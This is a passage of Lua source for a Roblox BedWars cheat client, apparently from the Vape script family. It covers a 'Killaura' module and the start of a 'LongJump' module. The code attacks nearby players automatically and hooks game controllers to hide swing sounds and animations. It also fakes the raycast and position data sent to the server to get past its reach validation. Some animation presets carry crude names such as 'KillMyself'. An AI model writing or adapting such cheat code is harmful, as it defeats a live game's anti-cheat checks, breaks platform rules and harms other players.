        {CFrame = CFrame.new(0.5, -0.51, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.08},
        {CFrame = CFrame.new(0.5, -0.01, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.08}
    },
    ["Rise"] = {
		{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0},
		{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0.900},
		{CFrame = CFrame.new(0.95, -1.06, -2.25) * CFrame.Angles(math.rad(-179), math.rad(61), math.rad(80)), Time = 0.15}
	},
    ["Rise2"] = {
        {CFrame = CFrame.new(0.9,0,0) * CFrame.Angles(math.rad(-80), math.rad(60), math.rad(-40)), Time = 0.14},
        {CFrame = CFrame.new(0.5,-0.2,-0.7) * CFrame.Angles(math.rad(-150), math.rad(55), math.rad(20)), Time = 0.14}
    },
    ["Rise3"] = {
        {CFrame = CFrame.new(0.6, -1, 0) * CFrame.Angles(-math.rad(190), math.rad(110), -math.rad(90)), Time = 0.3},
        {CFrame = CFrame.new(0.6, -1.5, 2) * CFrame.Angles(math.rad(120), math.rad(140), math.rad(320)), Time = 0.1}    
    },
    ["Rise4"] = {
        {CFrame = CFrame.new(0.3, -2, 0.5) * CFrame.Angles(-math.rad(190), math.rad(110), -math.rad(90)), Time = 0.3},
        {CFrame = CFrame.new(0.3, -1.5, 1.5) * CFrame.Angles(math.rad(120), math.rad(140), math.rad(320)), Time = 0.1}
    },
    ["Swong"] = {
        {CFrame = CFrame.new(0,0,-.6) * CFrame.Angles(math.rad(-60), math.rad(50), math.rad(-70)), Time = 0.1},
        {CFrame = CFrame.new(0,-.3, -.6) * CFrame.Angles(math.rad(-160), math.rad(60), math.rad(10)), Time = 0.2},
    },
    ["Eternal"] = {
        {CFrame = CFrame.new(0,0,-1) * CFrame.Angles(math.rad(-40), math.rad(60), math.rad(-80)), Time = 0.17},
        {CFrame = CFrame.new(0,0,-1) * CFrame.Angles(math.rad(-60), math.rad(60), math.rad(-80)), Time = 0.17}
    },
    ["monkey"] = {
		{CFrame = CFrame.new(0, -3, 0) * CFrame.Angles(-math.rad(120), math.rad(530), -math.rad(220)), Time = 0.2},
		{CFrame = CFrame.new(0.9, 0, 1.5) * CFrame.Angles(math.rad(7), math.rad(30), math.rad(820)), Time = 0.2}
	},
    ["Throw"] = {
		{CFrame = CFrame.new(-3, -3, -3) * CFrame.Angles(math.rad(255), math.rad(122), math.rad(321)), Time = 0.5},
		{CFrame = CFrame.new(1, 1, 1) * CFrame.Angles(math.rad(156), math.rad(54), math.rad(91)), Time = 0.5}
	},
    ["Slide"] = {
		{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-16), math.rad(60), math.rad(-80)), Time = 0},
		{CFrame = CFrame.new(0.7, -0.7, 0.6) * CFrame.Angles(math.rad(-171), math.rad(47), math.rad(74)), Time = 0.16}
	},
    ["Ketamine2"] = {
        {CFrame = CFrame.new(5, -3, 2) * CFrame.Angles(math.rad(120), math.rad(160), math.rad(140)), Time = 0.07},
        {CFrame = CFrame.new(5, -2.5, -1) * CFrame.Angles(math.rad(80), math.rad(180), math.rad(180)), Time = 0.07},
        {CFrame = CFrame.new(5, -3.4, -3.3) * CFrame.Angles(math.rad(45), math.rad(160), math.rad(190)), Time = 0.07},
        {CFrame = CFrame.new(5, -2.5, -1) * CFrame.Angles(math.rad(80), math.rad(180), math.rad(180)), Time = 0.07},
    },
    ["Astolfo2"] = {
		{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(25), math.rad(-60)), Time = 0.1},
		{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-40), math.rad(40), math.rad(-90)), Time = 0.1},
		{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(55), math.rad(-115)), Time = 0.1},
		{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-50), math.rad(70), math.rad(-60)), Time = 0.1},
		{CFrame = CFrame.new(0.63, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(70), math.rad(-70)), Time = 0.1}
	},
    ["Ketamine"] = {
		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(1), math.rad(-7), math.rad(7)), Time = 0},
		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(-0), math.rad(0), math.rad(-0)), Time = 0.08},
	    {CFrame = CFrame.new(-0.01, 0, 0) * CFrame.Angles(math.rad(-7), math.rad(-7), math.rad(-1)), Time = 0.08},
		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(1), math.rad(-7), math.rad(7)), Time = 0.11}
	},
    ["Swiss"] = {
		{CFrame = CFrame.new(1, -1.4, 1.4) * CFrame.Angles(math.rad(295), math.rad(55), math.rad(290)), Time = 0.25},
		{CFrame = CFrame.new(-1.4, 1, -1) * CFrame.Angles(math.rad(200), math.rad(60), math.rad(1)), Time = 0.25}
	},
    ["Old"] = {
		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(-math.rad(190), math.rad(110), -math.rad(90)), Time = 0.3},
		{CFrame = CFrame.new(0.3, -2, 2) * CFrame.Angles(math.rad(120), math.rad(140), math.rad(320)), Time = 0.3}
	},
    ["Extension"] = {
        {CFrame = CFrame.new(3, 0, 1) * CFrame.Angles(math.rad(-60), math.rad(30), math.rad(-40)), Time = 0.2},
        {CFrame = CFrame.new(3.3, -.2, 0.7) * CFrame.Angles(math.rad(-70), math.rad(10), math.rad(-20)), Time = 0.2},
        {CFrame = CFrame.new(3.8, -.2, 1.3) * CFrame.Angles(math.rad(-80), math.rad(0), math.rad(-20)), Time = 0.1},
        {CFrame = CFrame.new(3, .3, 1.3) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(-20)), Time = 0.07},
        {CFrame = CFrame.new(3, .3, .8) * CFrame.Angles(math.rad(-90), math.rad(10), math.rad(-40)), Time = 0.07},
    },
    ["Astolfo"] = {
        {CFrame = CFrame.new(5, -1, -1) * CFrame.Angles(math.rad(-40), math.rad(0), math.rad(0)), Time = 0.05},
        {CFrame = CFrame.new(5, -0.7, -1) * CFrame.Angles(math.rad(-120), math.rad(20), math.rad(-10)), Time = 0.05},
    },
    German = {
        {CFrame = CFrame.new(0.5, -0.01, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.10},
        {CFrame = CFrame.new(0.5, -0.51, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.08},
        {CFrame = CFrame.new(0.5, -0.01, -1.91) * CFrame.Angles(math.rad(-51), math.rad(9), math.rad(56)), Time = 0.08}
    },
    Penis = {
        {CFrame = CFrame.new(-1.8, 0.5, -1.01) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(-90)), Time = 0.05},
        {CFrame = CFrame.new(-1.8, -0.21, -1.01) * CFrame.Angles(math.rad(-90), math.rad(0), math.rad(-90)), Time = 0.05}
    },
    KillMyself = {
        {CFrame = CFrame.new(-2.5, -4.5, -0.02) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(-0)), Time = 0.1},
        {CFrame = CFrame.new(-2.5, -1, -0.02) * CFrame.Angles(math.rad(90), math.rad(0), math.rad(-0)), Time = 0.05}
    }
	}

	local function closestpos(block, pos)
		local blockpos = block:GetRenderCFrame()
		local startpos = (blockpos * CFrame.new(-(block.Size / 2))).p
		local endpos = (blockpos * CFrame.new((block.Size / 2))).p
		local speedCFrame = block.Position + (pos - block.Position)
		local x = startpos.X > endpos.X and endpos.X or startpos.X
		local y = startpos.Y > endpos.Y and endpos.Y or startpos.Y
		local z = startpos.Z > endpos.Z and endpos.Z or startpos.Z
		local x2 = startpos.X < endpos.X and endpos.X or startpos.X
		local y2 = startpos.Y < endpos.Y and endpos.Y or startpos.Y
		local z2 = startpos.Z < endpos.Z and endpos.Z or startpos.Z
		return Vector3.new(math.clamp(speedCFrame.X, x, x2), math.clamp(speedCFrame.Y, y, y2), math.clamp(speedCFrame.Z, z, z2))
	end

	local function getAttackData()
		if GuiLibrary.ObjectsThatCanBeSaved["Lobby CheckToggle"].Api.Enabled then 
			if bedwarsStore.matchState == 0 then return false end
		end
		if killauramouse.Enabled then
			if not inputService:IsMouseButtonPressed(0) then return false end
		end
		if killauragui.Enabled then
			if getOpenApps() > (bedwarsStore.equippedKit == "hannah" and 4 or 3) then return false end
		end
		local sword = killaurahandcheck.Enabled and bedwarsStore.localHand or getSword()
		if not sword or not sword.tool then return false end
		local swordmeta = bedwars.ItemTable[sword.tool.Name]
		if killaurahandcheck.Enabled then
			if bedwarsStore.localHand.Type ~= "sword" or bedwars.KatanaController.chargingMaid then return false end
		end
		return sword, swordmeta
	end

	local function autoBlockLoop()
		if not killauraautoblock.Enabled or not Killaura.Enabled then return end
		repeat
			if bedwarsStore.blockPlace < tick() and entityLibrary.isAlive then
				local shield = getItem("infernal_shield")
				if shield then 
					switchItem(shield.tool)
					if not lplr.Character:GetAttribute("InfernalShieldRaised") then
						bedwars.InfernalShieldController:raiseShield()
					end
				end
			end
			task.wait()
		until (not Killaura.Enabled) or (not killauraautoblock.Enabled)
	end

    Killaura = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
        Name = "Killaura",
        Function = function(callback)
            if callback then
				if killauraaimcirclepart then killauraaimcirclepart.Parent = gameCamera end
				if killaurarangecirclepart then killaurarangecirclepart.Parent = gameCamera end
				if killauraparticlepart then killauraparticlepart.Parent = gameCamera end

				task.spawn(function()
					local oldNearPlayer
					repeat
						task.wait()
						if (killauraanimation.Enabled and not killauraswing.Enabled) then
							if killauraNearPlayer then
								pcall(function()
									if originalArmC0 == nil then
										originalArmC0 = gameCamera.Viewmodel.RightHand.RightWrist.C0
									end
									if killauraplaying == false then
										killauraplaying = true
										for i,v in pairs(anims[killauraanimmethod.Value]) do 
											if (not Killaura.Enabled) or (not killauraNearPlayer) then break end
											if not oldNearPlayer and killauraanimationtween.Enabled then
												gameCamera.Viewmodel.RightHand.RightWrist.C0 = originalArmC0 * v.CFrame
												continue
											end
											killauracurrentanim = tweenService:Create(gameCamera.Viewmodel.RightHand.RightWrist, TweenInfo.new(v.Time), {C0 = originalArmC0 * v.CFrame})
											killauracurrentanim:Play()
											task.wait(v.Time - 0.01)
										end
										killauraplaying = false
									end
								end)	
							end
							oldNearPlayer = killauraNearPlayer
						end
					until Killaura.Enabled == false
				end)

                oldViewmodelAnimation = bedwars.ViewmodelController.playAnimation
                oldPlaySound = bedwars.SoundManager.playSound
                bedwars.SoundManager.playSound = function(tab, soundid, ...)
                    if (soundid == bedwars.SoundList.SWORD_SWING_1 or soundid == bedwars.SoundList.SWORD_SWING_2) and Killaura.Enabled and killaurasound.Enabled and killauraNearPlayer then
                        return nil
                    end
                    return oldPlaySound(tab, soundid, ...)
                end
                bedwars.ViewmodelController.playAnimation = function(Self, id, ...)
                    if id == 15 and killauraNearPlayer and killauraswing.Enabled and entityLibrary.isAlive then
                        return nil
                    end
                    if id == 15 and killauraNearPlayer and killauraanimation.Enabled and entityLibrary.isAlive then
                        return nil
                    end
                    return oldViewmodelAnimation(Self, id, ...)
                end

				local targetedPlayer
				RunLoops:BindToHeartbeat("Killaura", function()
					for i,v in pairs(killauraboxes) do 
						if v:IsA("BoxHandleAdornment") and v.Adornee then
							local cf = v.Adornee and v.Adornee.CFrame
							local onex, oney, onez = cf:ToEulerAnglesXYZ() 
							v.CFrame = CFrame.new() * CFrame.Angles(-onex, -oney, -onez)
						end
					end
					if entityLibrary.isAlive then
						if killauraaimcirclepart then 
							killauraaimcirclepart.Position = targetedPlayer and closestpos(targetedPlayer.RootPart, entityLibrary.character.HumanoidRootPart.Position) or Vector3.new(99999, 99999, 99999)
						end
						if killauraparticlepart then 
							killauraparticlepart.Position = targetedPlayer and targetedPlayer.RootPart.Position or Vector3.new(99999, 99999, 99999)
						end
						local Root = entityLibrary.character.HumanoidRootPart
						if Root then
							if killaurarangecirclepart then 
								killaurarangecirclepart.Position = Root.Position - Vector3.new(0, entityLibrary.character.Humanoid.HipHeight, 0)
							end
							local Neck = entityLibrary.character.Head:FindFirstChild("Neck")
							local LowerTorso = Root.Parent and Root.Parent:FindFirstChild("LowerTorso")
							local RootC0 = LowerTorso and LowerTorso:FindFirstChild("Root")
							if Neck and RootC0 then
								if originalNeckC0 == nil then
									originalNeckC0 = Neck.C0.p
								end
								if originalRootC0 == nil then
									originalRootC0 = RootC0.C0.p
								end
								if originalRootC0 and killauracframe.Enabled then
									if targetedPlayer ~= nil then
										local targetPos = targetedPlayer.RootPart.Position + Vector3.new(0, 2, 0)
										local direction = (Vector3.new(targetPos.X, targetPos.Y, targetPos.Z) - entityLibrary.character.Head.Position).Unit
										local direction2 = (Vector3.new(targetPos.X, Root.Position.Y, targetPos.Z) - Root.Position).Unit
										local lookCFrame = (CFrame.new(Vector3.zero, (Root.CFrame):VectorToObjectSpace(direction)))
										local lookCFrame2 = (CFrame.new(Vector3.zero, (Root.CFrame):VectorToObjectSpace(direction2)))
										Neck.C0 = CFrame.new(originalNeckC0) * CFrame.Angles(lookCFrame.LookVector.Unit.y, 0, 0)
										RootC0.C0 = lookCFrame2 + originalRootC0
									else
										Neck.C0 = CFrame.new(originalNeckC0)
										RootC0.C0 = CFrame.new(originalRootC0)
									end
								end
							end
						end
					end
				end)
				if killauraautoblock.Enabled then 
					task.spawn(autoBlockLoop)
				end
                task.spawn(function()
					repeat
						task.wait()
						if not Killaura.Enabled then break end
						vapeTargetInfo.Targets.Killaura = nil
						local plrs = AllNearPosition(killaurarange.Value, 10, killaurasortmethods[killaurasortmethod.Value], true)
						local firstPlayerNear
						if #plrs > 0 then
							local sword, swordmeta = getAttackData()
							if sword then
								switchItem(sword.tool)
								for i, plr in pairs(plrs) do
									local root = plr.RootPart
									if not root then 
										continue
									end
									local localfacing = entityLibrary.character.HumanoidRootPart.CFrame.lookVector
									local vec = (plr.RootPart.Position - entityLibrary.character.HumanoidRootPart.Position).unit
									local angle = math.acos(localfacing:Dot(vec))
									if angle >= (math.rad(killauraangle.Value) / 2) then
										continue
									end
									local selfrootpos = entityLibrary.character.HumanoidRootPart.Position
									if killauratargetframe.Walls.Enabled then
										if not bedwars.SwordController:canSee({player = plr.Player, getInstance = function() return plr.Character end}) then continue end
									end
									if not ({WhitelistFunctions:GetWhitelist(plr.Player)})[2] then
										continue
									end
									if killauranovape.Enabled and bedwarsStore.whitelist.clientUsers[plr.Player.Name] then
										continue
									end
									if not firstPlayerNear then 
										firstPlayerNear = true 
										killauraNearPlayer = true
										targetedPlayer = plr
										vapeTargetInfo.Targets.Killaura = {
											Humanoid = {
												Health = (plr.Character:GetAttribute("Health") or plr.Humanoid.Health) + getShieldAttribute(plr.Character),
												MaxHealth = plr.Character:GetAttribute("MaxHealth") or plr.Humanoid.MaxHealth
											},
											Player = plr.Player
										}
										if not killaurasync.Enabled then 
											if animationdelay <= tick() then
												animationdelay = tick() + 0.19
												if not killauraswing.Enabled then 
													bedwars.SwordController:playSwordEffect(swordmeta)
												end
											end
										end
									end
									if (workspace:GetServerTimeNow() - bedwars.SwordController.lastAttack) < 0.02 then 
										break
									end
									local selfpos = selfrootpos + (killaurarange.Value > 14 and (selfrootpos - root.Position).magnitude > 14.4 and (CFrame.lookAt(selfrootpos, root.Position).lookVector * ((selfrootpos - root.Position).magnitude - 14)) or Vector3.zero)
									if killaurasync.Enabled then 
										if animationdelay <= tick() then
											animationdelay = tick() + 0.19
											if not killauraswing.Enabled then 
												bedwars.SwordController:playSwordEffect(swordmeta)
											end
										end
									end
									bedwars.SwordController.lastAttack = workspace:GetServerTimeNow()
									bedwarsStore.attackReach = math.floor((selfrootpos - root.Position).magnitude * 100) / 100
									bedwarsStore.attackReachUpdate = tick() + 1
									killaurarealremote:FireServer({
										weapon = sword.tool,
										chargedAttack = {chargeRatio = swordmeta.sword.chargedAttack and not swordmeta.sword.chargedAttack.disableOnGrounded and 1 or 0},
										entityInstance = plr.Character,
										validate = {
											raycast = {
												cameraPosition = attackValue(root.Position), 
												cursorDirection = attackValue(CFrame.new(selfpos, root.Position).lookVector)
											},
											targetPosition = attackValue(root.Position),
											selfPosition = attackValue(selfpos)
										}
									})
									break
								end
							end
						end
						if not firstPlayerNear then 
							targetedPlayer = nil
							killauraNearPlayer = false
							pcall(function()
								if originalArmC0 == nil then
									originalArmC0 = gameCamera.Viewmodel.RightHand.RightWrist.C0
								end
								if gameCamera.Viewmodel.RightHand.RightWrist.C0 ~= originalArmC0 then
									pcall(function()
										killauracurrentanim:Cancel()
									end)
									if killauraanimationtween.Enabled then 
										gameCamera.Viewmodel.RightHand.RightWrist.C0 = originalArmC0
									else
										killauracurrentanim = tweenService:Create(gameCamera.Viewmodel.RightHand.RightWrist, TweenInfo.new(0.1), {C0 = originalArmC0})
										killauracurrentanim:Play()
									end
								end
							end)
						end
						for i,v in pairs(killauraboxes) do 
							local attacked = killauratarget.Enabled and plrs[i] or nil
							v.Adornee = attacked and ((not killauratargethighlight.Enabled) and attacked.RootPart or (not GuiLibrary.ObjectsThatCanBeSaved.ChamsOptionsButton.Api.Enabled) and attacked.Character or nil)
						end
					until (not Killaura.Enabled)
				end)
            else
				vapeTargetInfo.Targets.Killaura = nil
				RunLoops:UnbindFromHeartbeat("Killaura") 
                killauraNearPlayer = false
				for i,v in pairs(killauraboxes) do v.Adornee = nil end
				if killauraaimcirclepart then killauraaimcirclepart.Parent = nil end
				if killaurarangecirclepart then killaurarangecirclepart.Parent = nil end
				if killauraparticlepart then killauraparticlepart.Parent = nil end
                bedwars.ViewmodelController.playAnimation = oldViewmodelAnimation
                bedwars.SoundManager.playSound = oldPlaySound
                oldViewmodelAnimation = nil
                pcall(function()
					if entityLibrary.isAlive then
						local Root = entityLibrary.character.HumanoidRootPart
						if Root then
							local Neck = Root.Parent.Head.Neck
							if originalNeckC0 and originalRootC0 then 
								Neck.C0 = CFrame.new(originalNeckC0)
								Root.Parent.LowerTorso.Root.C0 = CFrame.new(originalRootC0)
							end
						end
					end
                    if originalArmC0 == nil then
                        originalArmC0 = gameCamera.Viewmodel.RightHand.RightWrist.C0
                    end
                    if gameCamera.Viewmodel.RightHand.RightWrist.C0 ~= originalArmC0 then
						pcall(function()
							killauracurrentanim:Cancel()
						end)
						if killauraanimationtween.Enabled then 
							gameCamera.Viewmodel.RightHand.RightWrist.C0 = originalArmC0
						else
							killauracurrentanim = tweenService:Create(gameCamera.Viewmodel.RightHand.RightWrist, TweenInfo.new(0.1), {C0 = originalArmC0})
							killauracurrentanim:Play()
						end
                    end
                end)
            end
        end,
        HoverText = "Attack players around you\nwithout aiming at them."
    })
    killauratargetframe = Killaura.CreateTargetWindow({})
	local sortmethods = {"Distance"}
	for i,v in pairs(killaurasortmethods) do if i ~= "Distance" then table.insert(sortmethods, i) end end
	killaurasortmethod = Killaura.CreateDropdown({
		Name = "Sort",
		Function = function() end,
		List = sortmethods
	})
    killaurarange = Killaura.CreateSlider({
        Name = "Attack range",
        Min = 1,
        Max = 18,
        Function = function(val) 
			if killaurarangecirclepart then 
				killaurarangecirclepart.Size = Vector3.new(val * 0.7, 0.01, val * 0.7)
			end
		end, 
        Default = 18
    })
    killauraangle = Killaura.CreateSlider({
        Name = "Max angle",
        Min = 1,
        Max = 360,
        Function = function(val) end,
        Default = 360
    })
	local animmethods = {}
	for i,v in pairs(anims) do table.insert(animmethods, i) end
    killauraanimmethod = Killaura.CreateDropdown({
        Name = "Animation", 
        List = animmethods,
        Function = function(val) end
    })
	local oldviewmodel
	local oldraise
	local oldeffect
	killauraautoblock = Killaura.CreateToggle({
		Name = "AutoBlock",
		Function = function(callback)
			if callback then 
				oldviewmodel = bedwars.ViewmodelController.setHeldItem
				bedwars.ViewmodelController.setHeldItem = function(self, newItem, ...)
					if newItem and newItem.Name == "infernal_shield" then 
						return
					end
					return oldviewmodel(self, newItem)
				end
				oldraise = bedwars.InfernalShieldController.raiseShield
				bedwars.InfernalShieldController.raiseShield = function(self)
					if os.clock() - self.lastShieldRaised < 0.4 then
						return
					end
					self.lastShieldRaised = os.clock()
					self.infernalShieldState:SendToServer({raised = true})
					self.raisedMaid:GiveTask(function()
						self.infernalShieldState:SendToServer({raised = false})
					end)
				end
				oldeffect = bedwars.InfernalShieldController.playEffect
				bedwars.InfernalShieldController.playEffect = function()
					return
				end
				if bedwars.ViewmodelController.heldItem and bedwars.ViewmodelController.heldItem.Name == "infernal_shield" then 
					local sword, swordmeta = getSword()
					if sword then 
						bedwars.ViewmodelController:setHeldItem(sword.tool)
					end
				end
				task.spawn(autoBlockLoop)
			else
				bedwars.ViewmodelController.setHeldItem = oldviewmodel
				bedwars.InfernalShieldController.raiseShield = oldraise
				bedwars.InfernalShieldController.playEffect = oldeffect
			end
		end,
		Default = true
	})
    killauramouse = Killaura.CreateToggle({
        Name = "Require mouse down",
        Function = function() end,
		HoverText = "Only attacks when left click is held.",
        Default = false
    })
    killauragui = Killaura.CreateToggle({
        Name = "GUI Check",
        Function = function() end,
		HoverText = "Attacks when you are not in a GUI."
    })
    killauratarget = Killaura.CreateToggle({
        Name = "Show target",
        Function = function(callback) 
			if killauratargethighlight.Object then 
				killauratargethighlight.Object.Visible = callback
			end
		end,
		HoverText = "Shows a red box over the opponent."
    })
	killauratargethighlight = Killaura.CreateToggle({
		Name = "Use New Highlight",
		Function = function(callback) 
			for i,v in pairs(killauraboxes) do 
				v:Remove()
			end
			for i = 1, 10 do 
				local killaurabox
				if callback then 
					killaurabox = Instance.new("Highlight")
					killaurabox.FillTransparency = 0.39
					killaurabox.FillColor = Color3.fromHSV(killauracolor.Hue, killauracolor.Sat, killauracolor.Value)
					killaurabox.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
					killaurabox.OutlineTransparency = 1
					killaurabox.Parent = GuiLibrary.MainGui
				else
					killaurabox = Instance.new("BoxHandleAdornment")
					killaurabox.Transparency = 0.39
					killaurabox.Color3 = Color3.fromHSV(killauracolor.Hue, killauracolor.Sat, killauracolor.Value)
					killaurabox.Adornee = nil
					killaurabox.AlwaysOnTop = true
					killaurabox.Size = Vector3.new(3, 6, 3)
					killaurabox.ZIndex = 11
					killaurabox.Parent = GuiLibrary.MainGui
				end
				killauraboxes[i] = killaurabox
			end
		end
	})
	killauratargethighlight.Object.BorderSizePixel = 0
	killauratargethighlight.Object.BackgroundTransparency = 0
	killauratargethighlight.Object.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
	killauratargethighlight.Object.Visible = false
	killauracolor = Killaura.CreateColorSlider({
		Name = "Target Color",
		Function = function(hue, sat, val) 
			for i,v in pairs(killauraboxes) do 
				v[(killauratargethighlight.Enabled and "FillColor" or "Color3")] = Color3.fromHSV(hue, sat, val)
			end
			if killauraaimcirclepart then 
				killauraaimcirclepart.Color = Color3.fromHSV(hue, sat, val)
			end
			if killaurarangecirclepart then 
				killaurarangecirclepart.Color = Color3.fromHSV(hue, sat, val)
			end
		end,
		Default = 1
	})
	for i = 1, 10 do 
		local killaurabox = Instance.new("BoxHandleAdornment")
		killaurabox.Transparency = 0.5
		killaurabox.Color3 = Color3.fromHSV(killauracolor["Hue"], killauracolor["Sat"], killauracolor.Value)
		killaurabox.Adornee = nil
		killaurabox.AlwaysOnTop = true
		killaurabox.Size = Vector3.new(3, 6, 3)
		killaurabox.ZIndex = 11
		killaurabox.Parent = GuiLibrary.MainGui
		killauraboxes[i] = killaurabox
	end
    killauracframe = Killaura.CreateToggle({
        Name = "Face target",
        Function = function() end,
		HoverText = "Makes your character face the opponent."
    })
	killaurarangecircle = Killaura.CreateToggle({
		Name = "Range Visualizer",
		Function = function(callback)
			if callback then 
				killaurarangecirclepart = Instance.new("MeshPart")
				killaurarangecirclepart.MeshId = "rbxassetid://3726303797"
				killaurarangecirclepart.Color = Color3.fromHSV(killauracolor["Hue"], killauracolor["Sat"], killauracolor.Value)
				killaurarangecirclepart.CanCollide = false
				killaurarangecirclepart.Anchored = true
				killaurarangecirclepart.Material = Enum.Material.Neon
				killaurarangecirclepart.Size = Vector3.new(killaurarange.Value * 0.7, 0.01, killaurarange.Value * 0.7)
				if Killaura.Enabled then 
					killaurarangecirclepart.Parent = gameCamera
				end
				bedwars.QueryUtil:setQueryIgnored(killaurarangecirclepart, true)
			else
				if killaurarangecirclepart then 
					killaurarangecirclepart:Destroy()
					killaurarangecirclepart = nil
				end
			end
		end
	})
	killauraaimcircle = Killaura.CreateToggle({
		Name = "Aim Visualizer",
		Function = function(callback)
			if callback then 
				killauraaimcirclepart = Instance.new("Part")
				killauraaimcirclepart.Shape = Enum.PartType.Ball
				killauraaimcirclepart.Color = Color3.fromHSV(killauracolor["Hue"], killauracolor["Sat"], killauracolor.Value)
				killauraaimcirclepart.CanCollide = false
				killauraaimcirclepart.Anchored = true
				killauraaimcirclepart.Material = Enum.Material.Neon
				killauraaimcirclepart.Size = Vector3.new(0.5, 0.5, 0.5)
				if Killaura.Enabled then 
					killauraaimcirclepart.Parent = gameCamera
				end
				bedwars.QueryUtil:setQueryIgnored(killauraaimcirclepart, true)
			else
				if killauraaimcirclepart then 
					killauraaimcirclepart:Destroy()
					killauraaimcirclepart = nil
				end
			end
		end
	})
	killauraparticle = Killaura.CreateToggle({
		Name = "Crit Particle",
		Function = function(callback)
			if callback then 
				killauraparticlepart = Instance.new("Part")
				killauraparticlepart.Transparency = 1
				killauraparticlepart.CanCollide = false
				killauraparticlepart.Anchored = true
				killauraparticlepart.Size = Vector3.new(3, 6, 3)
				killauraparticlepart.Parent = cam
				bedwars.QueryUtil:setQueryIgnored(killauraparticlepart, true)
				local particle = Instance.new("ParticleEmitter")
				particle.Lifetime = NumberRange.new(0.5)
				particle.Rate = 500
				particle.Speed = NumberRange.new(0)
				particle.RotSpeed = NumberRange.new(180)
				particle.Enabled = true
				particle.Size = NumberSequence.new(0.3)
				particle.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(67, 10, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 98, 255))})
				particle.Parent = killauraparticlepart
			else
				if killauraparticlepart then 
					killauraparticlepart:Destroy()
					killauraparticlepart = nil
				end
			end
		end
	})
    killaurasound = Killaura.CreateToggle({
        Name = "No Swing Sound",
        Function = function() end,
		HoverText = "Removes the swinging sound."
    })
    killauraswing = Killaura.CreateToggle({
        Name = "No Swing",
        Function = function() end,
		HoverText = "Removes the swinging animation."
    })
    killaurahandcheck = Killaura.CreateToggle({
        Name = "Limit to items",
        Function = function() end,
		HoverText = "Only attacks when your sword is held."
    })
    killauraanimation = Killaura.CreateToggle({
        Name = "Custom Animation",
        Function = function(callback)
			if killauraanimationtween.Object then killauraanimationtween.Object.Visible = callback end
		end,
		HoverText = "Uses a custom animation for swinging"
    })
	killauraanimationtween = Killaura.CreateToggle({
		Name = "No Tween",
		Function = function() end,
		HoverText = "Disable's the in and out ease"
	})
	killauraanimationtween.Object.Visible = false
	killaurasync = Killaura.CreateToggle({
        Name = "Synced Animation",
        Function = function() end,
		HoverText = "Times animation with hit attempt"
    })
	killauranovape = Killaura.CreateToggle({
		Name = "No Vape",
		Function = function() end,
		HoverText = "no hit vape user"
	})
	killauranovape.Object.Visible = false
	task.spawn(function()
		repeat task.wait() until WhitelistFunctions.Loaded
		killauranovape.Object.Visible = WhitelistFunctions.LocalPriority ~= 0
	end)
end)

local LongJump = {Enabled = false}
runFunction(function()
	local damagetimer = 0
	local damagetimertick = 0
	local directionvec
	local LongJumpSpeed = {Value = 1.5}
	local projectileRemote = bedwars.ClientHandler:Get(bedwars.ProjectileRemote)

	local function calculatepos(vec)
		local returned = vec
		if entityLibrary.isAlive then 
			local newray = workspace:Raycast(entityLibrary.character.HumanoidRootPart.Position, returned, bedwarsStore.blockRaycast)
			if newray then returned = (newray.Position - entityLibrary.character.HumanoidRootPart.Position) end
		end
		return returned
	end

	local damagemethods = {
		fireball = function(fireball, pos)
			if not LongJump.Enabled then return end
			pos = pos - (entityLibrary.character.HumanoidRootPart.CFrame.lookVector * 0.2)
			if not (getPlacedBlock(pos - Vector3.new(0, 3, 0)) or getPlacedBlock(pos - Vector3.new(0, 6, 0))) then
				local sound = Instance.new("Sound")
				sound.SoundId = "rbxassetid://4809574295"
				sound.Parent = workspace
				sound.Ended:Connect(function()
					sound:Destroy()
				end)
				sound:Play()
			end
			local origpos = pos
			local offsetshootpos = (CFrame.new(pos, pos + Vector3.new(0, -60, 0)) * CFrame.new(Vector3.new(-bedwars.BowConstantsTable.RelX, -bedwars.BowConstantsTable.RelY, -bedwars.BowConstantsTable.RelZ))).p
			local ray = workspace:Raycast(pos, Vector3.new(0, -30, 0), bedwarsStore.blockRaycast)
			if ray then
				pos = ray.Position
				offsetshootpos = pos
			end
			task.spawn(function()
				switchItem(fireball.tool)
				bedwars.ProjectileController:createLocalProjectile(bedwars.ProjectileMeta.fireball, "fireball", "fireball", offsetshootpos, "", Vector3.new(0, -60, 0), {drawDurationSeconds = 1})
				projectileRemote:CallServerAsync(fireball.tool, "fireball", "fireball", offsetshootpos, pos, Vector3.new(0, -60, 0), game:GetService("HttpService"):GenerateGUID(true), {drawDurationSeconds = 1}, workspace:GetServerTimeNow() - 0.045)
			end)
		end,
		tnt = function(tnt, pos2)
			if not LongJump.Enabled then return end
